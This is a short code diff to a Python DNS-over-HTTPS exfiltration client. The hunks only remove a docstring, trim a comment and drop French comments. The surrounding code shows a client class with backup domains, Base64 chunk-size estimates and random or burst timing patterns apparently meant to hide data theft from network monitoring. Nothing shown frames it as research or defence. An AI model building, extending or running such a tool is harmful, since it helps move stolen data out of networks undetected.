@@ -54,9 +54,7 @@ class ExfiltrationConfig:
         if self.backup_domains is None:
             self.backup_domains = []
 
-class DoHExfiltrationClient:
-    """DoH exfiltration client with configurable parameters"""
-    
+class DoHExfiltrationClient:    
     def __init__(self, config: ExfiltrationConfig):
         self.config = config
         self.session = requests.Session()
@@ -240,7 +238,7 @@ class DoHExfiltrationClient:
         
         chunk_size = min(chunk_size, AVAILABLE_SPACE)
         
-        estimated_encoded_size = data_size * 1.4  # Approximate Base64 overhead
+        estimated_encoded_size = data_size * 1.4  # Base64 overhead
         estimated_chunks = int(estimated_encoded_size / chunk_size) + 1
         
         print(f"Chunk size calculation:")
@@ -323,10 +321,8 @@ class DoHExfiltrationClient:
         base_time = len(chunks) * self.config.base_delay
         
         if self.config.timing_pattern == TimingPattern.RANDOM:
-            # Ajouter la variance moyenne
             base_time += len(chunks) * (self.config.delay_variance / 2)
         elif self.config.timing_pattern == TimingPattern.BURST:
-            # Calculer le temps avec les bursts
             num_bursts = len(chunks) // self.config.burst_size
             burst_time = num_bursts * self.config.burst_delay
             regular_time = (len(chunks) - num_bursts) * 0.01
